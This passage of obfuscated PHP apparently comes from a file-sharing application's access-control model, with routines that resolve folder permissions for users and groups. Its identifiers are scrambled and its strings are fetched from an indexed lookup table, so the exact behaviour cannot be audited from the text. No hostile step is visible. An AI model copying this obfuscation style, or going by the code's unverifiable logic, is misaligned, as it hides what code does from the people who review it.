$_SERVER[ŒÅŸ‹ä†]; $ÕÃ™¶•Ò = Model($…§‡ûÔÚ[1477])->sourceInfo($Ú¯Èá¬); if (!$ÕÃ™¶•Ò || $ÕÃ™¶•Ò[$…§‡ûÔÚ[199]] != SourceModel::TYPE_GROUP) { return array(); } $©Ş¥×¿¬ = Model($…§‡ûÔÚ[1477])->parentLevelArray($ÕÃ™¶•Ò[$…§‡ûÔÚ[609]]); $ª†ïâÃ– = array_merge(array(intval($Ú¯Èá¬)), array_reverse($©Ş¥×¿¬)); $û¼è–² = $this->sourceAuthSelect($ª†ïâÃ–); $Ôƒİœ•ù = $GLOBALS[$…§‡ûÔÚ[6]][$…§‡ûÔÚ[102]][$…§‡ûÔÚ[2231]] == 1; $àµÉ‹¡Í = $Ôƒİœ•ù ? 3 : 2; $¼Ê§¶öî = Model($…§‡ûÔÚ[1437])->getInfo($ÕÃ™¶•Ò[$…§‡ûÔÚ[594]]); $¾ŒÖ´É = explode($…§‡ûÔÚ[60], trim($¼Ê§¶öî[$…§‡ûÔÚ[609]], $…§‡ûÔÚ[60])); $Õùæ…Šë = array_merge(array($¼Ê§¶öî[$…§‡ûÔÚ[1439]]), array_reverse(array_slice($¾ŒÖ´É, $àµÉ‹¡Í))); foreach ($û¼è–² as $Ú¯Èá¬ => $äáëºÔ™) { foreach ($äáëºÔ™ as $¥œÑâêµ) { if (!$¥œÑâêµ || !$¥œÑâêµ[$…§‡ûÔÚ[594]] || $¥œÑâêµ[$…§‡ûÔÚ[594]] == $…§‡ûÔÚ[239]) { continue; } if ($¥œÑâêµ[$…§‡ûÔÚ[199]] != SourceModel::TYPE_GROUP) { continue; } $Õùæ…Šë[] = $¥œÑâêµ[$…§‡ûÔÚ[594]]; } } $Õùæ…Šë = array_unique($Õùæ…Šë); $Ÿ‰àŒ”» = array($…§‡ûÔÚ[438] => _get($GLOBALS[$…§‡ûÔÚ[7]], $…§‡ûÔÚ[438], 1), $…§‡ûÔÚ[449] => _get($GLOBALS[$…§‡ûÔÚ[7]], $…§‡ûÔÚ[449], 500)); $GLOBALS[$…§‡ûÔÚ[7]][$…§‡ûÔÚ[438]] = 1; $GLOBALS[$…§‡ûÔÚ[7]][$…§‡ûÔÚ[449]] = 500; $Œâ¾ê±³ = array($…§‡ûÔÚ[513] => 0, $…§‡ûÔÚ[2132] => AuthModel::authAll(), $…§‡ûÔÚ[514] => LNG($…§‡ûÔÚ[2311]), $…§‡ûÔÚ[2147] => $…§‡ûÔÚ[2312]); $¬ûÌµ‚ = array(); $€ŞÖÍï = explode($…§‡ûÔÚ[60], $…§‡ûÔÚ[2313]); $Éî¦Ä¡¦ = explode($…§‡ûÔÚ[60], $…§‡ûÔÚ[2314]); foreach ($Õùæ…Šë as $üõé‹‚ô) { $íîş¶²ˆ = Model($…§‡ûÔÚ[1437])->getInfo($üõé‹‚ô); $Ê“³ğ ´ = array_field_key($íîş¶²ˆ, $€ŞÖÍï); $¢ŞôíÔŞ = Model($…§‡ûÔÚ[622])->listByGroup($üõé‹‚ô); foreach ($¢ŞôíÔŞ[$…§‡ûÔÚ[455]] as $º°å×˜Û => $Ğ‚‚™¿£) { $this->userGroupList($Ğ‚‚™¿£[$…§‡ûÔÚ[1537]], $Ğ‚‚™¿£); $Èæ½àºÄ = $Ğ‚‚™¿£[$…§‡ûÔÚ[1537]] . $…§‡ûÔÚ[12]; if (isset($¬ûÌµ‚[$Èæ½àºÄ])) { continue; } $˜´¸­« = Model($…§‡ûÔÚ[2315])->listData($Ğ‚‚™¿£[$…§‡ûÔÚ[2316]]); $Ğ‚‚™¿£[$…§‡ûÔÚ[2317]] = Action($…§‡ûÔÚ[2318])->parseUrl($Ğ‚‚™¿£[$…§‡ûÔÚ[2317]]); $Ğ‚‚™¿£[$…§‡ûÔÚ[1885]] = $˜´¸­« && $˜´¸­«[$…§‡ûÔÚ[2319]] == 1; $Æó‰å™ò = $this->groupRootAuth($üõé‹‚ô, $Ğ‚‚™¿£[$…§‡ûÔÚ[1537]]); $Æó‰å™ò = $Ğ‚‚™¿£[$…§‡ûÔÚ[1885]] ? $Œâ¾ê±³ : $Æó‰å™ò; $¬ûÌµ‚[$Èæ½àºÄ] = array($…§‡ûÔÚ[2320] => $…§‡ûÔÚ[2321], $…§‡ûÔÚ[2322] => LNG($…§‡ûÔÚ[2323]), $…§‡ûÔÚ[2300] => array_field_key($Ğ‚‚™¿£, $Éî¦Ä¡¦), $…§‡ûÔÚ[507] => $Æó‰å™ò, $…§‡ûÔÚ[508] => $Æó‰å™ò[$…§‡ûÔÚ[507]], $…§‡ûÔÚ[2324] => $Ê“³ğ ´); } } $GLOBALS[$…§‡ûÔÚ[7]][$…§‡ûÔÚ[438]] = $Ÿ‰àŒ”»[$…§‡ûÔÚ[438]]; $GLOBALS[$…§‡ûÔÚ[7]][$…§‡ûÔÚ[449]] = $Ÿ‰àŒ”»[$…§‡ûÔÚ[449]]; foreach ($û¼è–² as $Ú¯Èá¬ => $äáëºÔ™) { if (!$äáëºÔ™) { continue; } foreach ($äáëºÔ™ as $¥œÑâêµ) { if (!$¥œÑâêµ || !$¥œÑâêµ[$…§‡ûÔÚ[594]] || $¥œÑâêµ[$…§‡ûÔÚ[594]] == $…§‡ûÔÚ[239]) { continue; } if ($¥œÑâêµ[$…§‡ûÔÚ[199]] != SourceModel::TYPE_USER) { continue; } $Èæ½àºÄ = $¥œÑâêµ[$…§‡ûÔÚ[594]] . $…§‡ûÔÚ[12]; if (isset($¬ûÌµ‚[$Èæ½àºÄ])) { continue; } $ãüßŠ½ë = $this->authMake($äáëºÔ™, $Èæ½àºÄ); if (!$ãüßŠ½ë || !$ãüßŠ½ë[$…§‡ûÔÚ[2322]]) { continue; } $¬ûÌµ‚[$Èæ½àºÄ] = array($…§‡ûÔÚ[2320] => $…§‡ûÔÚ[2325], $…§‡ûÔÚ[2322] => $ãüßŠ½ë[$…§‡ûÔÚ[2322]], $…§‡ûÔÚ[2300] => Model($…§‡ûÔÚ[622])->getInfoSimpleOuter($Èæ½àºÄ), $…§‡ûÔÚ[507] => $ãüßŠ½ë[$…§‡ûÔÚ[561]], $…§‡ûÔÚ[508] => $ãüßŠ½ë[$…§‡ûÔÚ[561]][$…§‡ûÔÚ[507]], $…§‡ûÔÚ[2324] => $ãüßŠ½ë[$…§‡ûÔÚ[2326]]); } } foreach ($û¼è–² as $Ú¯Èá¬ => $äáëºÔ™) { if (!$äáëºÔ™) { continue; } foreach ($¬ûÌµ‚ as $Èæ½àºÄ => $Ùë¬Åä) { if ($Ùë¬Åä[$…§‡ûÔÚ[2300]][$…§‡ûÔÚ[1885]] || $Ùë¬Åä[$…§‡ûÔÚ[2320]] == $…§‡ûÔÚ[2325]) { continue; } $ãüßŠ½ë = $this->authMake($äáëºÔ™, $Èæ½àºÄ); if (!$ãüßŠ½ë || !$ãüßŠ½ë[$…§‡ûÔÚ[2322]]) { continue; } $¬ûÌµ‚[$Èæ½àºÄ] = array($…§‡ûÔÚ[2320] => $…§‡ûÔÚ[2325], $…§‡ûÔÚ[2322] => $ãüßŠ½ë[$…§‡ûÔÚ[2322]], $…§‡ûÔÚ[2300] => $Ùë¬Åä[$…§‡ûÔÚ[2300]], $…§‡ûÔÚ[507] => $ãüßŠ½ë[$…§‡ûÔÚ[561]], $…§‡ûÔÚ[508] => $ãüßŠ½ë[$…§‡ûÔÚ[561]][$…§‡ûÔÚ[507]], $…§‡ûÔÚ[2324] => $ãüßŠ½ë[$…§‡ûÔÚ[2326]]); } } $¬ûÌµ‚ = array_sort_by($¬ûÌµ‚, $…§‡ûÔÚ[508], $…§‡ûÔÚ[545]); return $¬ûÌµ‚; } public function getAllChildren($ê†Ü÷ı­) { $ÅÀ ˜Íß =& $_SERVER[ŒÅŸ‹ä†]; $µ¤àÀåù = Model($ÅÀ ˜Íß[1477])->sourceInfo($ê†Ü÷ı­); if ($µ¤àÀåù[$ÅÀ ˜Íß[505]] != $ÅÀ ˜Íß[101]) { return $this->sourceListAuth(array($ê†Ü÷ı­)); } if ($µ¤àÀåù[$ÅÀ ˜Íß[199]] != SourceModel::TYPE_GROUP) { return array(); } $â´Íì¬Ş = 1; $ Ú„èî¡ = array($ê†Ü÷ı­); if ($µ¤àÀåù[$ÅÀ ˜Íß[201]] == $ÅÀ ˜Íß[239] && $µ¤àÀåù[$ÅÀ ˜Íß[594]] != $â´Íì¬Ş) { $ Ú„èî¡ = $this->groupChidldAllRootSource($µ¤àÀåù[$ÅÀ ˜Íß[594]]); } $ñöÇå—Ë = $this->field($ÅÀ ˜Íß[202])->group($ÅÀ ˜Íß[202])->select(); $ñöÇå—Ë = array_to_keyvalue($ñöÇå—Ë, $ÅÀ ˜Íß[12], $ÅÀ ˜Íß[202]); if (!$ñöÇå—Ë) { return array(); } $íòŸ•Üß = $ÅÀ ˜Íß[2327]; $öŞ¡İ¡ = array($ÅÀ ˜Íß[202] => array($ÅÀ ˜Íß[7], $ñöÇå—Ë), $ÅÀ ˜Íß[525] => $ÅÀ ˜Íß[239]); $õ´á—‚û = Model($ÅÀ ˜Íß[929])->field($íòŸ•Üß)->where($öŞ¡İ¡)->select(); $µÏØÚ = array($ê†Ü÷ı­); foreach ($õ´á—‚û as $ é€×ø) { foreach ($ Ú„èî¡ as $·Ùò±¼ê) { $şÔÂ‘„¾ = $ÅÀ ˜Íß[60] . $·Ùò±¼ê . $ÅÀ ˜Íß[60]; $éÖ“¥ÚĞ = $ é€×ø[$ÅÀ ˜Íß[609]] . $ é€×ø[$ÅÀ ˜Íß[202]] . $ÅÀ ˜Íß[60]; if (strstr($éÖ“¥ÚĞ, $şÔÂ‘„¾)) { $µÏØÚ[] = $ é€×ø[$ÅÀ ˜Íß[202]]; break; } } } return $this->sourceListAuth($µÏØÚ); } private function sourceListAuth($ŸÖàåú˜) { $şÓş¸É÷ =& $_SERVER[ŒÅŸ‹ä†]; $ÂŠú•´ = Model($şÓş¸É÷[1477])->sourceListInfo($ŸÖàåú˜, !0); $æ¦¡“€‹ = $this->sourceAuthSelect($ŸÖàåú˜); $‰È«Û³Ä = array(); $ƒ—Ò¶ = array(); foreach ($ÂŠú•´ as $À¬§‹ ú) { unset($À¬§‹ ú[$şÓş¸É÷[548]]); unset($À¬§‹ ú[$şÓş¸É÷[546]]); unset($À¬§‹ ú[$şÓş¸É÷[507]]); unset($À¬§‹ ú[$şÓş¸É÷[100]]); $¬¹»Í²Ï = $æ¦¡“€‹[$À¬§‹ ú[$şÓş¸É÷[202]]]; if (!$¬¹»Í²Ï) { continue; } $À¬§‹ ú[$şÓş¸É÷[2324]] = $this->authTargetInfo($¬¹»Í²Ï); $À¬§‹ ú[$şÓş¸É÷[607]] = rtrim($À¬§‹ ú[$şÓş¸É÷[613]], $şÓş¸É÷[8]) . $şÓş¸É÷[8] . ltrim($À¬§‹ ú[$şÓş¸É÷[607]], $şÓş¸É÷[8]); $‰È«Û³Ä[] = $À¬§‹ ú; $¢™áóé = count(explode($şÓş¸É÷[8], trim($À¬§‹ ú[$şÓş¸É÷[607]], $şÓş¸É÷[8]))); $ƒ—Ò¶[] = $¢™áóé + ($À¬§‹ ú[$şÓş¸É÷[43]] == $şÓş¸É÷[88] ? 0 : 1000); } array_multisort($ƒ—Ò¶, SORT_ASC, $‰È«Û³Ä); return $‰È«Û³Ä; } private function groupChidldAllRootSource($öäœÀ˜Ï) { $ÀàÎ£Ì˜ =& $_SERVER[ŒÅŸ‹ä†]; $«î›øÉ½ = Model($ÀàÎ£Ì˜[1437])->groupChildrenAll($öäœÀ˜Ï); $æ—ÙÛÍ = array($ÀàÎ£Ì˜[201] => 0, $ÀàÎ£Ì˜[594] => array($ÀàÎ£Ì˜[7], $«î›øÉ½), $ÀàÎ£Ì˜[199] => SourceModel::TYPE_GROUP); $Ã”Éşƒ = Model($ÀàÎ£Ì˜[929])->field($ÀàÎ£Ì˜[202])->where($æ—ÙÛÍ)->select(); $Ã”Éşƒ = array_to_keyvalue($Ã”Éşƒ, $ÀàÎ£Ì˜[12], $ÀàÎ£Ì˜[202]); return $Ã”Éşƒ; } private function authTargetInfo($¯ŞÒŸ) { $«àÁÆ¢ñ =& $_SERVER[ŒÅŸ‹ä†]; $µ¼„¼” = array(); $ÄÅú¾Š² = array(); $Ó„²’ìø = 2 << 25; foreach ($¯ŞÒŸ as $—›â€êÁ) { $æ´øÉ£ = Model($«àÁÆ¢ñ[596])->listData($—›â€êÁ[$«àÁÆ¢ñ[1584]]); if (!$æ´øÉ£) { continue; } if ($—›â€êÁ[$«àÁÆ¢ñ[199]] == SourceModel::TYPE_USER) { $ô‹•’©· = Model($«àÁÆ¢ñ[602])->getInfoSimpleOuter($—›â€êÁ[$«àÁÆ¢ñ[594]]); if ($ô‹•’©·[$«àÁÆ¢ñ[1537]] == $«àÁÆ¢ñ[1321]) { continue; } if ($ô‹•’©·[$«àÁÆ¢ñ[1537]] == $«àÁÆ¢ñ[239]) { $ô‹•’©·[$«àÁÆ¢ñ[42]] = LNG($«àÁÆ¢ñ[2328]); } } else { $ô‹•’©· = Model($«àÁÆ¢ñ[610])->getInfoSimple($—›â€êÁ[$«àÁÆ¢ñ[594]]); } if (!$ô‹•’©·) { continue; } $ô‹•’©·[$«àÁÆ¢ñ[561]] = $æ´øÉ£; $µ¼„¼”[] = $ô‹•’©·; $Ñé—À®ˆ = 0; if ($—›â€êÁ[$«àÁÆ¢ñ[199]] == SourceModel::TYPE_GROUP) { $Ñé—À®ˆ = $Ó„²’ìø * 2; } if ($—›â€êÁ[$«àÁÆ¢ñ[199]] == SourceModel::TYPE_USER) { $Ñé—À®ˆ = $Ó„²’ìø; } if ($—›â€êÁ[$«àÁÆ¢ñ[199]] == SourceModel::TYPE_USER && $—›â€êÁ[$«àÁÆ¢ñ[594]] == $«àÁÆ¢ñ[239]) { $Ñé—À®ˆ = 0; } $ÄÅú¾Š²[] = $æ´øÉ£[$«àÁÆ¢ñ[507]] + $Ñé—À®ˆ; } array_multisort($ÄÅú¾Š², SORT_DESC, $µ¼„¼”); return $µ¼„¼”; } public function getAllChildrenByUser($­ú×¾Ş, $ïÚÈµ´Ñ) { $½ãÆ¹œ¼ =& $_SERVER[ŒÅŸ‹ä†]; $ˆÍŒ¹— = Model($½ãÆ¹œ¼[622])->getInfo($ïÚÈµ´Ñ); if (!$ïÚÈµ´Ñ || !$­ú×¾Ş || !$ˆÍŒ¹—) { return array(); } $íº×š™ı = Model($½ãÆ¹œ¼[1477])->sourceInfo($­ú×¾Ş); $ş½ğäÏ = array(); $§è‹âı = 1; if ($íº×š™ı[$½ãÆ¹œ¼[201]] == $½ãÆ¹œ¼[239] && $íº×š™ı[$½ãÆ¹œ¼[594]] != $§è‹âı && $this->groupContainUser($íº×š™ı[$½ãÆ¹œ¼[594]], $ïÚÈµ´Ñ)) { foreach ($ˆÍŒ¹—[$½ãÆ¹œ¼[1438]] as $ŠÛ¶Ûş) { $ñéº‘Ã = Model($½ãÆ¹œ¼[610])->getInfo($ŠÛ¶Ûş[$½ãÆ¹œ¼[1439]]); $Ô‡¼åô† = Model($½ãÆ¹œ¼[622])->getInfoSimpleOuter($ïÚÈµ´Ñ); $Ô‡¼åô†[$½ãÆ¹œ¼[561]] = $ŠÛ¶Ûş[$½ãÆ¹œ¼[507]]; if (Model($½ãÆ¹œ¼[596])->authCheckAction($ŠÛ¶Ûş[$½ãÆ¹œ¼[507]][$½ãÆ¹œ¼[507]], $½ãÆ¹œ¼[1509])) { continue; } $Í¼ö­« = array($½ãÆ¹œ¼[42] => $½ãÆ¹œ¼[1340] . $ñéº‘Ã[$½ãÆ¹œ¼[42]], $½ãÆ¹œ¼[202] => $ñéº‘Ã[$½ãÆ¹œ¼[100]][$½ãÆ¹œ¼[202]], $½ãÆ¹œ¼[97] => KodIO::make($ñéº‘Ã[$½ãÆ¹œ¼[100]][$½ãÆ¹œ¼[202]]), $½ãÆ¹œ¼[201] => $½ãÆ¹œ¼[239], $½ãÆ¹œ¼[199] => $½ãÆ¹œ¼[603], $½ãÆ¹œ¼[43] => $½ãÆ¹œ¼[644], $½ãÆ¹œ¼[607] => $ñéº‘Ã[$½ãÆ¹œ¼[614]], $½ãÆ¹œ¼[1439] => $ñéº‘Ã[$½ãÆ¹œ¼[1439]], $½ãÆ¹œ¼[611] => $ñéº‘Ã[$½ãÆ¹œ¼[201]], $½ãÆ¹œ¼[2324] => array($Ô‡¼åô†)); $ş½ğäÏ[$Í¼ö­«[$½ãÆ¹œ¼[202]]] = $Í¼ö­«; } } $ñº°Û¬™ = array(); $êÛÖà = $this->getAllChildren($­ú×¾Ş); foreach ($êÛÖà as $ñŞ›şŠÚ) { $±¨ÂŞÁ¦ = !1; foreach ($ñŞ›şŠÚ[$½ãÆ¹œ¼[2324]] as $‡ñ–ß«ú) { if ($‡ñ–ß«ú[$½ãÆ¹œ¼[1537]]) { if ($‡ñ–ß«ú[$½ãÆ¹œ¼[1537]] == $ïÚÈµ´Ñ) { $±¨ÂŞÁ¦ = !0; break; } } if ($‡ñ–ß«ú[$½ãÆ¹œ¼[1439]]) { if ($this->groupContainUser($‡ñ–ß«ú[$½ãÆ¹œ¼[1439]], $ïÚÈµ´Ñ)) { $±¨ÂŞÁ¦ = !0; break; } } } if ($±¨ÂŞÁ¦) { $ñº°Û¬™[] = $ñŞ›şŠÚ; } $˜çŠß±ß = $ñŞ›şŠÚ[$½ãÆ¹œ¼[202]]; if (isset($ş½ğäÏ[$˜çŠß±ß])) { $ñŞ›şŠÚ[$½ãÆ¹œ¼[2324]][] = $ş½ğäÏ[$˜çŠß±ß][0]; $ş½ğäÏ[$˜çŠß±ß] = !1; } } $ş½ğäÏ = array_filter(array_values($ş½ğäÏ)); $ñº°Û¬™ = array_merge($ş½ğäÏ, $ñº°Û¬™); return $ñº°Û¬™; } public function setAllChildrenByUser($Ùôş´ÇÌ, $ìä¹»Îô, $È¤ÆáÖ³) { $¾íğî‚Ø =& $_SERVER[ŒÅŸ‹ä†]; $ºù¦ = $this->getAllChildrenByUser($Ùôş´ÇÌ, $ìä¹»Îô); if (!$È¤ÆáÖ³ || !$ºù¦) { return !1; } foreach ($ºù¦ as $Ÿë™®÷ò) { $±ó‚ı¯ = array(); foreach ($Ÿë™®÷ò[$¾íğî‚Ø[2324]] as $ïú±Å®’) { $È¥óÒÚƒ = $ïú±Å®’[$¾íğî‚Ø[561]]; $ªÜèÑÎ» = $ïú±Å®’[$¾íğî‚Ø[1537]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ğâóÇşª = $ïú±Å®’[$¾íğî‚Ø[1537]] ? $ïú±Å®’[$¾íğî‚Ø[1537]] : $ïú±Å®’[$¾íğî‚Ø[1439]]; if ($ïú±Å®’[$¾íğî‚Ø[1537]] && $ïú±Å®’[$¾íğî‚Ø[1537]] == $ìä¹»Îô) { continue; } $±ó‚ı¯[] = array($¾íğî‚Ø[202] => $Ÿë™®÷ò[$¾íğî‚Ø[202]], $¾íğî‚Ø[199] => $ªÜèÑÎ», $¾íğî‚Ø[594] => intval($ğâóÇşª), $¾íğî‚Ø[1584] => isset($È¥óÒÚƒ[$¾íğî‚Ø[492]]) ? intval($È¥óÒÚƒ[$¾íğî‚Ø[492]]) : 0, $¾íğî‚Ø[2288] => isset($È¥óÒÚƒ[$¾íğî‚Ø[2288]]) ? intval($È¥óÒÚƒ[$¾íğî‚Ø[2288]]) : -1); } $±ó‚ı¯[] = array($¾íğî‚Ø[202] => $Ÿë™®÷ò[$¾íğî‚Ø[202]], $¾íğî‚Ø[199] => SourceModel::TYPE_USER, $¾íğî‚Ø[594] => intval($ìä¹»Îô), $¾íğî‚Ø[1584] => intval($È¤ÆáÖ³), $¾íğî‚Ø[2288] => -1); $this->where(array($¾íğî‚Ø[511] => $Ÿë™®÷ò[$¾íğî‚Ø[202]]))->delete(); $this->addAll($±ó‚ı¯); } return !0; } public function get($¬ÃàÄ˜µ) { $ƒù·Ëê§ = $this->getSourceList(array($¬ÃàÄ˜µ), !0); return $ƒù·Ëê§[0]; } public function getSourceList($û“¨½È, $Èå®˜íÕ = false, $ÈË‰Â÷ = false) { $ËÎÍ¥áö =& $_SERVER[ŒÅŸ‹ä†]; if (!$û“¨½È) { return array(); } $¡Ğ½ûÕ° = Model($ËÎÍ¥áö[1477]); if (!$Èå®˜íÕ && count($û“¨½È) == 1) { $Èå®˜íÕ = array(); $Èå®˜íÕ[$û“¨½È[0]] = $¡Ğ½ûÕ°->sourceInfo($û“¨½È[0]); } if (!$Èå®˜íÕ) { $Å´…ÊÇØ = array($ËÎÍ¥áö[511] => array($ËÎÍ¥áö[512], $û“¨½È)); $Èå®˜íÕ = $¡Ğ½ûÕ°->field($ËÎÍ¥áö[2329])->where($Å´…ÊÇØ)->select(); $Èå®˜íÕ = array_to_keyvalue($Èå®˜íÕ, $ËÎÍ¥áö[202]); } $Ş¬¡‰í = $û“¨½È; foreach ($Èå®˜íÕ as $Ã¸ˆÎê => $¶”ƒÇê¥) { $¨Éçæ©ù = $¡Ğ½ûÕ°->parentLevelArray($¶”ƒÇê¥[$ËÎÍ¥áö[609]]); $Ş¬¡‰í = array_merge($Ş¬¡‰í, array(intval($Ã¸ˆÎê)), array_reverse($¨Éçæ©ù)); } $Ş¬¡‰í = array_values(array_unique($Ş¬¡‰í)); if (!$Ş¬¡‰í) { return array(); } $×Àğ™ş‰ = $this->sourceAuthSelect($Ş¬¡‰í); $›ğšÛô› = array(); foreach ($Ş¬¡‰í as $šÓÃ÷ğÛ) { if (isset($×Àğ™ş‰[$šÓÃ÷ğÛ])) { $›ğšÛô›[$šÓÃ÷ğÛ] = $×Àğ™ş‰[$šÓÃ÷ğÛ]; } } $†½ÄÛ–ã = $this->userIsRoot($ÈË‰Â÷); $¸”ŸÍÖµ = AuthModel::authAll(); $ìÈ›Ëúñ = array($ËÎÍ¥áö[508] => $¸”ŸÍÖµ, $ËÎÍ¥áö[2330] => array($ËÎÍ¥áö[513] => 0, $ËÎÍ¥áö[2132] => $¸”ŸÍÖµ, $ËÎÍ¥áö[514] => LNG($ËÎÍ¥áö[2311]), $ËÎÍ¥áö[2147] => $ËÎÍ¥áö[2312])); $ÕÅæ¼ªÏ = array(); foreach ($Èå®˜íÕ as $šÓÃ÷ğÛ => $§ôÉá½¥) { if ($†½ÄÛ–ã && $GLOBALS[$ËÎÍ¥áö[6]][$ËÎÍ¥áö[2145]]) { $ÕÅæ¼ªÏ[$šÓÃ÷ğÛ] = $ìÈ›Ëúñ; continue; } $ÕÅæ¼ªÏ[$šÓÃ÷ğÛ] = $this->makeSourceAuth($§ôÉá½¥, $›ğšÛô›, $ÈË‰Â÷); } return $ÕÅæ¼ªÏ; } public function authDeepCheck($–àŠóõÔ, $›÷ÖØ’ = false) { $ªÁÏ€ûÛ =& $_SERVER[ŒÅŸ‹ä†]; $›÷ÖØ’ = $›÷ÖØ’ ? $›÷ÖØ’ : USER_ID; $Ó°„û§‡ = $this->makeAuthDeep($›÷ÖØ’); if (!in_array($–àŠóõÔ, $Ó°„û§‡[$ªÁÏ€ûÛ[2331]])) { return !1; } $¡×Œ´¢¼ = array(); foreach ($Ó°„û§‡[$ªÁÏ€ûÛ[2332]] as $Ä³üÅÈ› => $ÃüğéÌÌ) { if (!in_array($–àŠóõÔ, $ÃüğéÌÌ)) { continue; } $¡×Œ´¢¼[] = $Ä³üÅÈ›; } if (!$¡×Œ´¢¼) { return !1; } $ÌışŠÔ = $¡×Œ´¢¼ ? $¡×Œ´¢¼[0] : $–àŠóõÔ; return array($ªÁÏ€ûÛ[508] => -1, $ªÁÏ€ûÛ[561] => array($ªÁÏ€ûÛ[513] => $ªÁÏ€ûÛ[1321], $ªÁÏ€ûÛ[2132] => $ªÁÏ€ûÛ[239], $ªÁÏ€ûÛ[514] => LNG($ªÁÏ€ûÛ[2333]), $ªÁÏ€ûÛ[2147] => $ªÁÏ€ûÛ[2334]), $ªÁÏ€ûÛ[2322] => LNG($ªÁÏ€ûÛ[2335]), $ªÁÏ€ûÛ[2336] => $this->sourceAuthInfo($ÌışŠÔ)); } protected function makeAuthDeep($¯©¿Ä® = false) { $Ó¹‡Ğ¯ö =& $_SERVER[ŒÅŸ‹ä†]; static $»«„×­Ñ = array(); $¯©¿Ä® = $¯©¿Ä® ? $¯©¿Ä® : USER_ID; if (isset($»«„×­Ñ[$¯©¿Ä®])) { return $»«„×­Ñ[$¯©¿Ä®]; } $„ø‘Ì·Å = Model($Ó¹‡Ğ¯ö[2337])->listData(); $¨©è¡ Ë = array(); foreach ($„ø‘Ì·Å as $‹ŸµÕ«œ) { if ($‹ŸµÕ«œ[$Ó¹‡Ğ¯ö[507]] == 0 && $‹ŸµÕ«œ[$Ó¹‡Ğ¯ö[2146]] == $Ó¹‡Ğ¯ö[101]) { $¨©è¡ Ë[] = $‹ŸµÕ«œ[$Ó¹‡Ğ¯ö[492]]; } } $–õŞú¡Å = $this->userGroupParents($¯©¿Ä®); $Ùï°†òÒ = array($Ó¹‡Ğ¯ö[199] => SourceModel::TYPE_USER, $Ó¹‡Ğ¯ö[594] => $¯©¿Ä®); if ($–õŞú¡Å) { $Ùï°†òÒ = array(array($Ó¹‡Ğ¯ö[199] => SourceModel::TYPE_USER, $Ó¹‡Ğ¯ö[594] => $¯©¿Ä®), array($Ó¹‡Ğ¯ö[199] => SourceModel::TYPE_GROUP, $Ó¹‡Ğ¯ö[594] => array($Ó¹‡Ğ¯ö[512], $–õŞú¡Å)), $Ó¹‡Ğ¯ö[1111] => $Ó¹‡Ğ¯ö[2226]); } $·şò÷ æ = $this->field($Ó¹‡Ğ¯ö[2338])->where($Ùï°†òÒ)->select(); $š­Î¹ã„ = array(); $ŞòâŒŒ = array_to_keyvalue_group($·şò÷ æ, $Ó¹‡Ğ¯ö[202]); foreach ($ŞòâŒŒ as $¤å®µè => $ÑÛ¸Ñİ) { $®Ò’ÕÎæ = $this->authArrayCheck($ÑÛ¸Ñİ, $¯©¿Ä®); if ($®Ò’ÕÎæ[$Ó¹‡Ğ¯ö[508]] > 0) { $š­Î¹ã„[] = $¤å®µè . $Ó¹‡Ğ¯ö[12]; } } if ($–õŞú¡Å) { $«¸¤öÁº = Model($Ó¹‡Ğ¯ö[610]); foreach ($–õŞú¡Å as $’ğşÎè¯) { $şÉ„Ñ = $«¸¤öÁº->getInfo($’ğşÎè¯); if (!$şÉ„Ñ || !is_array($şÉ„Ñ[$Ó¹‡Ğ¯ö[100]])) { continue; } $š­Î¹ã„[] = $şÉ„Ñ[$Ó¹‡Ğ¯ö[100]][$Ó¹‡Ğ¯ö[202]]; } } $°é„¹ÒÈ = array(); $œñ–¼çù = $–õŞú¡Å; $Í¢ÑàÔ = Model($Ó¹‡Ğ¯ö[1477]); $«¸¤öÁº = Model($Ó¹‡Ğ¯ö[610]); $Ï§„ã­× = array(); $ƒêÉƒê² = array(); $üæßÌÕë = array(); $ùº«ŸÃ = array(); if ($š­Î¹ã„) { $¡·’´Ôï = $Í¢ÑàÔ->where(array($Ó¹‡Ğ¯ö[202] => array($Ó¹‡Ğ¯ö[512], $š­Î¹ã„)))->select(); foreach ($¡·’´Ôï as $¢Œ‰õî–) { if ($¢Œ‰õî–[$Ó¹‡Ğ¯ö[525]] == $Ó¹‡Ğ¯ö[101]) { continue; } $¹ßÎ›À = $Í¢ÑàÔ->parentLevelArray($¢Œ‰õî–[$Ó¹‡Ğ¯ö[609]]); $°é„¹ÒÈ = array_merge($°é„¹ÒÈ, $¹ßÎ›À); $œñ–¼çù[] = $¢Œ‰õî–[$Ó¹‡Ğ¯ö[594]]; $Ï§„ã­×[$¢Œ‰õî–[$Ó¹‡Ğ¯ö[202]]] = $¹ßÎ›À; $ƒêÉƒê²[$¢Œ‰õî–[$Ó¹‡Ğ¯ö[202]]] = $¢Œ‰õî–[$Ó¹‡Ğ¯ö[594]]; } } $œñ–¼çù = array_values(array_unique($œñ–¼çù)); $¹¹ã×óÃ = $œñ–¼çù; foreach ($¹¹ã×óÃ as $’ğşÎè¯) { $şÉ„Ñ = $«¸¤öÁº->getInfo($’ğşÎè¯); $¹ßÎ›À = $Í¢ÑàÔ->parentLevelArray($şÉ„Ñ[$Ó¹‡Ğ¯ö[609]]); $œñ–¼çù = array_merge($œñ–¼çù, $¹ßÎ›À); } $œñ–¼çù = array_values(array_unique($œñ–¼çù)); foreach ($œñ–¼çù as $’ğşÎè¯) { $şÉ„Ñ = $«¸¤öÁº->getInfo($’ğşÎè¯); $°é„¹ÒÈ[] = $şÉ„Ñ[$Ó¹‡Ğ¯ö[100]][$Ó¹‡Ğ¯ö[202]]; $üæßÌÕë[$’ğşÎè¯] = $şÉ„Ñ[$Ó¹‡Ğ¯ö[100]][$Ó¹‡Ğ¯ö[202]]; $ùº«ŸÃ[$’ğşÎè¯] = $Í¢ÑàÔ->parentLevelArray($şÉ„Ñ[$Ó¹‡Ğ¯ö[609]]); } foreach ($Ï§„ã­× as $ì½¸– => $¯Ì˜ç) { $À»³šçÍ = $ƒêÉƒê²[$ì½¸–]; if (!$À»³šçÍ || !$üæßÌÕë[$À»³šçÍ]) { continue; } $—½™Éß· = array(); foreach ($ùº«ŸÃ[$À»³šçÍ] as $’ğşÎè¯) { $—½™Éß·[] = $üæßÌÕë[$’ğşÎè¯]; } $Ï§„ã­×[$ì½¸–] = array_merge($—½™Éß·, $¯Ì˜ç); } $°é„¹ÒÈ = array_values(array_unique($°é„¹ÒÈ)); $š¤â”“ = array($Ó¹‡Ğ¯ö[2331] => $°é„¹ÒÈ, $Ó¹‡Ğ¯ö[2332] => $Ï§„ã­×); $»«„×­Ñ[$¯©¿Ä®] = $š¤â”“; return $š¤â”“; } private function 